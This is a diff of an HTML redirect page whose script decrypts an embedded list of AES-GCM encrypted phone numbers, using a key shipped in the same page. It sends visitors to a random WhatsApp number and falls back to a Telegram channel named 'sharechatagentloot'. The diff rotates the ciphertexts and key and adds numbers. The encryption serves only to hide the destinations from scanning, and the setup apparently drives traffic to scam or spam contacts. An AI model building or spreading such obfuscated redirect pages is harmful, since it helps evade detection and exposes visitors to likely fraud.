@@ -6,261 +6,269 @@
 <title>Redirecting...</title>
 <script>
 (async function(){
-  // AES-GCM encrypted numbers list (iv, ct, tag) - Base64 encoded
   const encrypted = [
   {
-    "iv": "HDLpwAaaOmpM1G+T",
-    "ct": "ZNKs8IArpPVm044L",
-    "tag": "ZfRPRPRJeLEHMjT4c6xe2Q=="
+    "iv": "mJO/Hf4mOOwYNKWi",
+    "ct": "24wkw5rprEX90Liv",
+    "tag": "c/nCd9Kj/xcY5hcTwI4jhA=="
   },
   {
-    "iv": "LxQc2TmbTHOYbjr0",
-    "ct": "j3UQ5TaFTx+zqX8u",
-    "tag": "FRSTHuitSrVaPzgFgCeodg=="
+    "iv": "MD2DLuBHMsoSBHrG",
+    "ct": "TrZZSoMg0U05Oyjb",
+    "tag": "znCGZXcK0EXe/8H+0uA8pA=="
   },
   {
-    "iv": "QE2x0tsMdANRAs6v",
-    "ct": "TF0x+Wyj7Lt/6wUZ",
-    "tag": "n5FaG4Lf4DEeIev/o/Vymw=="
+    "iv": "7RimYovgsUvJgHmx",
+    "ct": "zbGVksUHzfUjoL8x",
+    "tag": "n43lcw8oWcKmIFKOFkBUeg=="
   },
   {
-    "iv": "hLzxikLhdWnjUVGh",
-    "ct": "BoZlO/Jw6/Wy0MZb",
-    "tag": "RoRWOK1FkmQKfs/XgSWlyQ=="
+    "iv": "06cE4ZydsW/xOA1x",
+    "ct": "tRLV6ShsSqTHxyis",
+    "tag": "KvVIRbIZgWdirti292hSDQ=="
   },
   {
-    "iv": "k77Ot4Ajo7kyitZR",
-    "ct": "y8mbkSN4oFDCM9On",
-    "tag": "KTtQ6pPVm7y33UHHAG25Ew=="
+    "iv": "44/p0CSZWiVbB4yl",
+    "ct": "P/M3vqRtQ0VRKS8b",
+    "tag": "Nr8/vS6csKJKr1zpUvxr8A=="
   },
   {
-    "iv": "4cuWvGrqE8SDgJlc",
-    "ct": "M+Lj4NQVvWw2OLKa",
-    "tag": "qeWPhjTqgYVuvcGqPPa3Mw=="
+    "iv": "ie5uxgTkhvAzZZ6U",
+    "ct": "l7TTSrHn6btrDJe5",
+    "tag": "qA5pTdbqhaRvP+RkXhmBEQ=="
   },
   {
-    "iv": "BPhVGNzcllnUkH0+",
-    "ct": "NimzuUo4U1norVi6",
-    "tag": "OFpBdkOi+sz7vJpAvOJFfA=="
+    "iv": "gsICkGHaLCudGo9D",
+    "ct": "uEgYNXjEp/IX8QsB",
+    "tag": "iR1z20tRgudc06RSELKWsA=="
   },
   {
-    "iv": "DT/iJxv15LayFO7l",
-    "ct": "1rDEksJrct0Pg8xA",
-    "tag": "kM1y/MLbLVh/q62nnIQ1DA=="
+    "iv": "vUEFl5C/BxNRlI1O",
+    "ct": "6sjTREErybcVqToZ",
+    "tag": "DidZ51h+mNd99XMAxH80fA=="
   },
   {
-    "iv": "JgdoEiaflDJVMOo5",
-    "ct": "q14RRwhC2F7raHZ/",
-    "tag": "bYr6q2FWk2xgwCON9lbl5g=="
+    "iv": "K5dm6kHFMNxQRhIp",
+    "ct": "BlsfOt0xG4QRaoJy",
+    "tag": "0OGN3lNT7oRsF2OVPLVBhA=="
   },
   {
-    "iv": "LtHceCZZ6Y1sfTz+",
-    "ct": "B9TQi4llJgERSlXH",
-    "tag": "Ypu6lOrTxyfrgz+ySJBa4w=="
+    "iv": "YVneb1OvWV3lNoOE",
+    "ct": "DLIUkYlrVu4kfvce",
+    "tag": "s2tz5oXqrFUDV5cp15NpEg=="
   },
   {
-    "iv": "DLLY8mMZX58rpz6H",
-    "ct": "BEjfopAJyX2rjSfQ",
-    "tag": "C/WmUK7O+n89eciipmkR1w=="
+    "iv": "4VxAsQoAmO5NALIy",
+    "ct": "+Ydq6hHl3iqOgS+v",
+    "tag": "yM1EaN1tgwCIT2j9rfZ9gw=="
   },
   {
-    "iv": "Pi49Rin2f1e18x4x",
-    "ct": "iJEggpcMSY4EttFL",
-    "tag": "M7XNCLw5QFC5PzfTd4cvZw=="
+    "iv": "+LQI+L2tSWm4EJFJ",
+    "ct": "fTImNi9BvJ+H9TIx",
+    "tag": "JS/kI43ovPe11wDaIkznlw=="
   },
   {
-    "iv": "Oj5Jn2SUBQ0kgZub",
-    "ct": "RyP7NWlDzZfqaQ9V",
-    "tag": "Ibdzabz64jZikygGc4bvzg=="
+    "iv": "ZAJ2HP7UHSFnpyof",
+    "ct": "Lx+ysAKjVoUa5t7v",
+    "tag": "BiS1fb3iMF0iHvbkTE/YgA=="
   },
   {
-    "iv": "oWsWPMP8NoS/eM4k",
-    "ct": "1Ae/iES6OS7/qR/o",
-    "tag": "Rvpf2L9V8sy3m1TFVyl3tw=="
+    "iv": "wa3D2clnET2YZsRo",
+    "ct": "8fRg3Q2uJO2uPBDy",
+    "tag": "09CRCYWAQV57tYpptAwqKA=="
   },
   {
-    "iv": "yE/UeAU27g2VFE3C",
-    "ct": "EAhO95u8mEIaG6gW",
-    "tag": "Cus/zZamjeh8JpH98Y2JMg=="
+    "iv": "CWly+qpRrWthkaYp",
+    "ct": "nQcsbVrt2vAGEf2a",
+    "tag": "z2qs04y/gZlzM/CiIy1Gdg=="
   },
   {
-    "iv": "C7Skiw3DGiCTBkae",
-    "ct": "GufOA2DExC9R8CPj",
-    "tag": "WDrQrDyLMK7x1eaSviCjrQ=="
+    "iv": "V0TUmxjTGSgobIuV",
+    "ct": "V9+sRdcf+IikPa/F",
+    "tag": "9E3bZU7UvghHZ3vybwsQIQ=="
   },
   {
-    "iv": "2hKGhd9Q5DVTSN6l",
-    "ct": "YyjZPWejQPzPUFfM",
-    "tag": "cXMfqA+QdtT1XjY8Cv5rIw=="
+    "iv": "jyciP8+7KHh4MFfe",
+    "ct": "dAglreky90IJO/eo",
+    "tag": "Jrmm5LykCIEL9oRqcwUzsA=="
   },
   {
-    "iv": "0HOW17McflpB/Yxm",
-    "ct": "dS3wxWwtCwnUWdK2",
-    "tag": "9JXfhXQaVY+9Y97tw5ejuw=="
+    "iv": "GSyullfnIsWI95nh",
+    "ct": "/2Jl+WJwNmSGSdvS",
+    "tag": "lrFJGGawgn5TCUgOQFoRlg=="
   },
   {
-    "iv": "EWEGL8rmrGGrJBzq",
-    "ct": "3Z4F09PnPpdR7hyT",
-    "tag": "uSi26ss/VxB4q6X+/qKZHA=="
+    "iv": "cWBLIHam5RWeGutu",
+    "ct": "egbKYvvFXPEWw/oG",
+    "tag": "rHbGGSVAGDqCIyJX3Go+ww=="
   },
   {
-    "iv": "2ADkiNVvs8yL230f",
-    "ct": "+zHWB+28zRJJCXtS",
-    "tag": "6HSQ9nuyjFX8DLhxUh4UrA=="
+    "iv": "Rly6V+fcdNNG00BJ",
+    "ct": "9uG+zZq4vz7k8v1nCw==",
+    "tag": "R++Iz82d8qf6jz7OId6dkQ=="
   },
   {
-    "iv": "YvECT3f/0wlxETNm",
-    "ct": "8zeaIYmj251sKOTz",
-    "tag": "HeS8YBxfh0HU3nw1zV69hg=="
+    "iv": "KVTsy1iWqGdqyPE7",
+    "ct": "+mgfUiLpuXK280e+",
+    "tag": "LldAkkRQL6X/b+eqSSs+qw=="
   },
   {
-    "iv": "gFzkAPUo4gIAAdwl",
-    "ct": "s2xzrlBL/Bp0euMY",
-    "tag": "MVVs0YV+H6fNhEddHmWzGA=="
+    "iv": "O7Lu2LQFT7nFfWqd",
+    "ct": "4dITnGDmhZ93Skqt",
+    "tag": "iq5vxh4Z8BbZBJMewuwzDg=="
   },
   {
-    "iv": "0ST8yaCgerusiqFW",
-    "ct": "AFwRzq50CjoSbQel",
-    "tag": "30PaABETvJ0DIrqwE9TMLA=="
+    "iv": "95aFNNfxVwWRtQ5c",
+    "ct": "BN2ChnKU/cLo2lbm",
+    "tag": "eCROIzB5XNYZt+zoGspqOQ=="
   },
   {
-    "iv": "DuPoc4S5Hw/FA1mc",
-    "ct": "CmPzrbd1CxIKqcU1",
-    "tag": "IaCGgbpIXsyuQxxLDQjqZA=="
+    "iv": "eN9v9P1DGBAiwpja",
+    "ct": "A+Lv8FnrfmlZSlI=",
+    "tag": "0Hn6HsmG5L06sRU71IimMA=="
   },
   {
-    "iv": "tVEIFQZjqehoYfW/",
-    "ct": "WJpBq0hhpPagAdUI",
-    "tag": "YfDU4iuwP2fxGLFKZTqN6w=="
+    "iv": "P/jn/wc37NKoJkbi",
+    "ct": "mtvk0vMxftHBnVv1",
+    "tag": "DK/XF3lH8DoR4id2yIwP5Q=="
   },
   {
-    "iv": "fweTOACam5avdAvA",
-    "ct": "yz4HxZoXe1vGrwPV",
-    "tag": "kg027n8ui1v9ANBzyYn2XQ=="
+    "iv": "x5XGvUgfHSMn6JB0",
+    "ct": "ry0IzOn/+oQzXeVZsw==",
+    "tag": "6n/uKfhJYuyJr0JmmojHgQ=="
   },
   {
-    "iv": "xjoHqVQGDLy4q92M",
-    "ct": "UgQ4916+iKMHSqdy",
-    "tag": "YAW4YA07BJt6rHAUHWEhLA=="
+    "iv": "0MuXxit/FMR2nJME",
+    "ct": "GxxzEi3bMy63UakH",
+    "tag": "MtRm5/+FmsbX1lLhyHeK1w=="
   },
   {
-    "iv": "O4PAr9bbCiqcbRHa",
-    "ct": "wvOF6hgrAIR8H8+z",
-    "tag": "wDwaMRo1rU+YpVWEeZnFMg=="
+    "iv": "XmjYsu9cU+ijK+fh",
+    "ct": "OuLRNOBctf6XjQTP",
+    "tag": "ZjXS9cdCqswL+yX8E4NHQQ=="
   },
   {
-    "iv": "jh9YuL84yh1xLkDn",
-    "ct": "BLgfgzpX3DBFCgUX",
-    "tag": "HhA0XDafhFQYfX3alBDCVA=="
+    "iv": "RsMM2cQe9nhG0ya7",
+    "ct": "bM55jycRS85ABFy7",
+    "tag": "qZAJi6jmpSpgs9gSuNe7XQ=="
   },
   {
-    "iv": "2jVLOa/LGZg8HHYz",
-    "ct": "N7CljF4wn6x18YbW",
-    "tag": "yyUMsUiZeewhNlgHanwdSQ=="
+    "iv": "VxxpUNfC/8+vXGkY",
+    "ct": "wtLd3ut6L3xeIUc=",
+    "tag": "/jeBuGfokG4u+XcegzZDnA=="
   },
   {
-    "iv": "5RZ1N0fFZBV88xwB",
-    "ct": "32EzRhoE5Baw6ACV",
-    "tag": "/gyIjXesfw/5C1D1aeo6Vg=="
+    "iv": "ZWL5Nv92k8cOj+WR",
+    "ct": "qVne8kpo71HvtUEu",
+    "tag": "Mj4VmjkKgM15e0PDouX/cQ=="
   },
   {
-    "iv": "6KECGUETSGkOQAKh",
-    "ct": "VSezfzE0/1jes8Pu",
-    "tag": "tzWzXg9fTxmKbKFU1bTSsw=="
+    "iv": "l2SIdPI4LyNbMwFh",
+    "ct": "VVh0l60EGPvqc8k8Wg==",
+    "tag": "K6ReNGk2P7H8mkdw2UhEkQ=="
   },
   {
-    "iv": "ne41ItHgPcEfuw0p",
-    "ct": "qcoW+nN0zMnkDEW9",
-    "tag": "K2s1m9gcUTLypf7RmnfdjA=="
+    "iv": "dnZkeSfovGAfb+7s",
+    "ct": "9kuywiS6reem6s4=",
+    "tag": "Bb9yeV0nthDDNVt0703AlQ=="
   },
   {
-    "iv": "b+udUYvGz6oL6kw4",
-    "ct": "YxOqBO7bkAQeM89C",
-    "tag": "jaUrl8DaO8V6tt10BYOdCA=="
+    "iv": "3zuUIctsityCoql3",
+    "ct": "WZN3VqHFRFCmdrvs",
+    "tag": "h/Crsu9blDzc2gF22TrNmg=="
   },
   {
-    "iv": "uohLmDkC4hhRIO5G",
-    "ct": "Zju/Q/SaikGNgq2b",
-    "tag": "0WzXuB/7pIB8MQYSbYTqjA=="
+    "iv": "vcHChaBPXngzpnq0",
+    "ct": "P49NFOzPRtrEnjst",
+    "tag": "2n4Kfn6QHXpbrzDZ33dMvw=="
   },
   {
-    "iv": "RVL2H6qVVuqG1Vkt",
-    "ct": "yTwNlJSBtHrraiRq",
-    "tag": "oy35Ni/43nmqshRuRGXxFg=="
+    "iv": "HAHPy7bfqOprKwaI",
+    "ct": "ESzEg0CQTG0ADqEW",
+    "tag": "BWvOeNr0Oyt0uwVSBV57JQ=="
   },
   {
-    "iv": "AkssoIQZpXazI5kA",
-    "ct": "yuI21x3ePQqefmGK",
-    "tag": "KNtuoEtmhZEfaISUD043hA=="
+    "iv": "a1Ih26ktF1Z/Tifc",
+    "ct": "l2cY6K5D5mAkin4=",
+    "tag": "nYmu7MSsoWJaWPuKnfjgwA=="
   },
   {
-    "iv": "Hm/ztKvkul/gW0yL",
-    "ct": "bnzqBYJHM2ypqJiB",
-    "tag": "hEJ2gsMFcCf/60RmXepNgw=="
+    "iv": "OeMAsWeWrEs/tOkq",
+    "ct": "UCrqB6N0tglcOQg=",
+    "tag": "GeQ/5nbZ3aGkQGItJU0+Bg=="
   },
   {
-    "iv": "cAIuIKyuTy7gPXFa",
-    "ct": "JKR9wUcIIYR8nKH6",
-    "tag": "+zPv5rKBoWE5ufaWVGYiVA=="
+    "iv": "i0bLyn5kXa4E6RSp",
+    "ct": "TUtgcKStlw9bP56Haw==",
+    "tag": "owDpensYkajJesYS5AoIfg=="
   },
   {
-    "iv": "m4h/rcilgrSkjIGp",
-    "ct": "rmXjduo6Uk8vNQyc",
-    "tag": "UaXs40Uw6BmsTV/1al0yfQ=="
+    "iv": "M7O6BonzmKVVSeBK",
+    "ct": "yd/8Z4aPzd64o53qxg==",
+    "tag": "WIboe+fXYRys9pA9wLkQ1A=="
   },
   {
-    "iv": "JM0BqCvAt5W+HBQU",
-    "ct": "cpwdSoGJSuMjqv20",
-    "tag": "UH07Uzqgy0IHn8tcPLFKwg=="
+    "iv": "51gk/9+/KebAbT6+",
+    "ct": "X385wfopWeCYWOww",
+    "tag": "O7RAX6YRHzwET8JeWsBvNQ=="
   },
   {
-    "iv": "2rPWDmLxOQDw9Fhq",
-    "ct": "fyhS4FvB9lDw2M8X",
-    "tag": "dTDnZjPY4B+IaNipqxqWxg=="
+    "iv": "f/rIE+IUnqilb4IA",
+    "ct": "cSJw1VPLtYrq0hAc",
+    "tag": "mVZ+HHXtESEUIOO/fSQm9A=="
   },
   {
-    "iv": "/Flklz8GrKESsEy6",
-    "ct": "6h8YBu4HXyKurY1n",
-    "tag": "DrArdrGBvl9bjQPdWgu5ww=="
+    "iv": "uhCECwpxerBx1ScN",
+    "ct": "q03RQvau4gmXJXcz",
+    "tag": "7r8ma+QpN5lSTOOtWw3Jbg=="
   },
   {
-    "iv": "UnOmELKdoC6vc+9j",
-    "ct": "c7ebLBofZg2AyESd",
-    "tag": "W/cH25/eIIIMHOpwK/eLjA=="
+    "iv": "Kv5c9wvR90KUCDVf",
+    "ct": "yjdRA1pTWkXKRzKw",
+    "tag": "Od9SjiJKbKAgALrj7qQ7tw=="
   },
   {
-    "iv": "7JS2jfRcviDjgdwu",
-    "ct": "fpvLrIyVwxyceZfe",
-    "tag": "SwlgzZJCpqwZlxGWHxRnQg=="
+    "iv": "NIXSQj38lt26FtUK",
+    "ct": "yyAvhU4oWcg1d42d",
+    "tag": "5zZsbfWMhUMSsrbAIJO5OA=="
   },
   {
-    "iv": "LSIAtSKmsZA2H/jM",
-    "ct": "Hnp4kwV2Zi8WYHqc",
-    "tag": "rl0syqDT/RT7bhw0uGns5w=="
+    "iv": "TR9A7TWjUN+wGaF/",
+    "ct": "I3+QR4AnmnPuVsUQ",
+    "tag": "tcKMZdk/xOg2iXHJlf4cTQ=="
   },
   {
-    "iv": "DmdGnHOj+DVW9nSj",
-    "ct": "cc1TPR2UGIuIuMhG",
-    "tag": "gsl1okYhaidQYsE1GsmOqA=="
+    "iv": "M4Du5sMRvlisNePg",
+    "ct": "W6lI1VOGgrXKgGvY",
+    "tag": "onHQRJ2FZWo8OWACdVsjTg=="
   },
   {
-    "iv": "4vU2OELofGNwkOB5",
-    "ct": "/WunBhcC3ryzVCt9",
-    "tag": "x5s8Rb6BvpqrEN0iBSvcQQ=="
+    "iv": "mYyjBjCKPKtVaRYc",
+    "ct": "FLvIc9f2uvfVAPuF",
+    "tag": "TerpUR/MvnROI5UCOAVy9g=="
   },
   {
-    "iv": "YKATv6hDCT5qlcYD",
-    "ct": "4sPdLVsEqTTHkQ+4",
-    "tag": "9wZjx0X7DonGtFEPcUbgEA=="
+    "iv": "y38/X16xZgP7SP4t",
+    "ct": "7TJvMwwU9zvdrfrX",
+    "tag": "+cKIj6pdrJoqLxT5Xp6iiQ=="
   },
   {
-    "iv": "7D6b3O/ibdZjNH3H",
-    "ct": "2ZG/6NbABf1ExmeQ",
-    "tag": "TVWzx4d0IYQRK0O5idpqpQ=="
+    "iv": "ksbqt5ER/vlGQyRJ",
+    "ct": "gMzoWK2giaAWQfkQ",
+    "tag": "77eToAnu5uBI7i3zgSXBHg=="
+  },
+  {
+    "iv": "CABi8AJetESLUm0F",
+    "ct": "EVRNp3+wuIriap84",
+    "tag": "pe/RvcM//LiRaXezfaTLew=="
+  },
+  {
+    "iv": "S5NCaSLiJpY99nXO",
+    "ct": "ie15WAq3IVavo52CRw==",
+    "tag": "q/s0VU6fGNA4Fek4GCrWzg=="
   }
 ];
-
-  const key_b64 = "6WaHGwimyHISlEQVnr87NdiRjgSfRSdiSpadCn2Uqfk=";
+  const key_b64 = "jbtYStoNkw9Se6Ed33qALkpLLv2mNd6TvZyzHbJIBOU=";
 
   function b64ToArr(b64){ 
     const s = atob(b64); 
@@ -269,44 +277,40 @@
     return arr;
   }
 
-  // import raw AES key
-  const keyRaw = b64ToArr(key_b64);
-  const cryptoKey = await crypto.subtle.importKey("raw", keyRaw, "AES-GCM", false, ["decrypt"]);
+  try{
+    const keyRaw = b64ToArr(key_b64);
+    const cryptoKey = await crypto.subtle.importKey("raw", keyRaw, "AES-GCM", false, ["decrypt"]);
 
-  // helper to decrypt one entry
-  async function decryptEntry(entry){
-    try{
-      const iv = b64ToArr(entry.iv);
-      const ct = b64ToArr(entry.ct);
-      const tag = b64ToArr(entry.tag);
-      // concatenate ct + tag
-      const ctTag = new Uint8Array(ct.length + tag.length);
-      ctTag.set(ct, 0);
-      ctTag.set(tag, ct.length);
-      const plain = await crypto.subtle.decrypt({name:"AES-GCM", iv: iv, tagLength: 128}, cryptoKey, ctTag);
-      const decoder = new TextDecoder();
-      return decoder.decode(plain);
-    }catch(e){
-      return null;
+    async function decryptEntry(entry){
+      try{
+        const iv = b64ToArr(entry.iv);
+        const ct = b64ToArr(entry.ct);
+        const tag = b64ToArr(entry.tag);
+        const ctTag = new Uint8Array(ct.length + tag.length);
+        ctTag.set(ct, 0);
+        ctTag.set(tag, ct.length);
+        const plain = await crypto.subtle.decrypt({name:"AES-GCM", iv: iv, tagLength: 128}, cryptoKey, ctTag);
+        const decoder = new TextDecoder();
+        return decoder.decode(plain);
+      }catch(e){
+        return null;
+      }
     }
-  }
 
-  // decrypt all (in parallel)
-  const promises = encrypted.map(e => decryptEntry(e));
-  const results = await Promise.all(promises);
-  const numbers = results.filter(Boolean).map(s => s.replace(/[^0-9]/g, ''));
+    const promises = encrypted.map(e => decryptEntry(e));
+    const results = await Promise.all(promises);
+    const numbers = results.filter(Boolean).map(s => s.replace(/[^0-9]/g, ''));
 
-  if(numbers.length === 0){
-    // fallback
+    if(numbers.length === 0){
+      window.location.replace("https://t.me/sharechatagentloot");
+      return;
+    }
+
+    const pick = numbers[Math.floor(Math.random()*numbers.length)];
+    window.location.replace("https://wa.me/" + pick);
+  }catch(e){
     window.location.replace("https://t.me/sharechatagentloot");
-    return;
   }
-
-  // pick random number and redirect
-  const pick = numbers[Math.floor(Math.random()*numbers.length)];
-  // redirect to WhatsApp (replace history)
-  window.location.replace("https://wa.me/" + pick);
-
 })();
 </script>
 </head>
